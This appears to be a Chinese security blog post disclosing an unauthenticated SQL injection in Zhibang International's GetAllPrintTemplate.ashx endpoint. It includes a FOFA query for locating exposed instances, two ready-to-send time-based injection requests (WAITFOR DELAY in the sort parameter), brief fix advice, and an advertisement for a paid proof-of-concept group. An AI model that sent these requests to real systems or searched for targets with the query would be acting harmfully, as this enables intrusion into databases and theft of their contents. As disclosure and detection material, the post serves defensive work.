#  智邦国际GetAllPrintTemplate存在SQL注入漏洞  
北雪网络安全
                    北雪网络安全  北雪网络安全   2026-10-12 01:08  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjDYf12ibRnEeEtopNx3PkezF1gJDoVomDEiaVtyRiauRcq3xsDq4aYNFewBhVIzZQ87qWX2AFEOH5VBNG7vKApicOSf0YcoIgLbM8/640?wx_fmt=png&from=appmsg "")  
  
网络安全为人民，网络安全靠人民  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaoZyVTrAD0ISfiacoxzA1bE6TcPelSpxnIvmnrMkOmc03Y054HpZEIb9Bd89Vyvn2AA70ibbG8CDCD6rkgSIFqUhjnHq6NBMJdc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziaBtKRPenma6icx4J7oO9MOJRKXic7RXYFOBWLwtA9rL6FtzKWR4jL5ZSes2NctiaxqWFL0Ve54aqQWu9qhsstHmBprvv7vmt6G6s/640?wx_fmt=png&from=appmsg "")  
  
**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjEGCJNuZSKLw9N8zqJWw8rI9LRsbRz619AxcDw6BCpdIT6R3IeDxTlE1G3JVswPfNXbNVQVnmpdVZ8amgLpWADLWnHQZABiags/640?wx_fmt=png&from=appmsg "")  
  
  
  
01  
  
更多内容  
  
#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296  
  
  
02  
  
搜索引擎  
  
  
fofa  
：  
body="/SYSN/" || icon_hash="-682445886"  
  
  
03  
  
漏洞复现  
  
  
智邦国际  
GetAllPrintTemplate  
接口存在  
SQL  
注入漏洞，未经身份验证的远程攻击者除了可以利用  
 SQL   
注入漏洞获取数  
据库中的信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziaBcUVfFbnVMw4MwXL5u7EmS5D76KMibK5b2rib3BqFmPR46tZmt4UFUNUAWTiaAsK48vZ3ibT8po6xlHkybymYPHNDiasFjGomaATA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaiamn0uTL5Q3JklQBPT6OiceWIg2gq3HhczDyNIbpqOygic7jNDq69GCCia8iau4R16z1xBzibJRVaWTiczuAwHwDEEoicYwpZ8MHucwM/640?wx_fmt=png&from=appmsg "")  
  
```
GET /SYSN/json/pcclient/GetAllPrintTemplate.ashx?sort=12;WAITFOR+DELAY+'0:0:2'-- HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaJ6ibiapthjee68smHzNH9LtXkepAicHAIiaPQB149sxakMWpZycvQFR4QWIXpahnuKQrSUKiciacLpw2FZyMDHp1DcUn3adVZmT1ns/640?wx_fmt=png&from=appmsg "")  
  
```
GET /SYSN/json/pcclient/GetAllPrintTemplate.ashx?sort=12;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziaWViadGIJicqauVic2qQCHWvhDFtQ7SOnNbwDwibcC7IMuk8WxLWF0dORwjF9TTthy11SYSRicYNyStrmTLx6Wd5osWJicBPsia5lrKA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjdqnFB6vnkIBcvK47rtoSBSEOM8QE2q6tndANdxfthGgyRzUD77AGQXnjWaW8cBeo1wdicWyibUKTFY7zrbJFZuCfOzQJfyazcI/640?wx_fmt=png&from=appmsg "")  
  
  
      
  
04  
  
修复建议  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
05  
  
内部圈子  
  
🛠️   
【知名漏洞实战圈，纯干货】  
🛠️  
  
还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！  
  
目前已更新poc数量2500+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaLiboleRcibYWBmVGYdxBgzu8h0w2x9EK7ibX5cbLIBhEDh4ceNFDs9hspfR9BZDMwnXbDeGwLqsW0R7qYcRqu1s83FUTiauQYib1M/640?wx_fmt=png&from=appmsg "")  
  
🎯 适用场景  
  
**▫️渗透测试▫️企业漏洞自查▫️攻防演练▫️安全服务▫️合规运营**  
  
****  
  
**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**  
  
**▫️全民掌握网安技能，共守智能时代晴空。**  
  
  
  
  
  
  
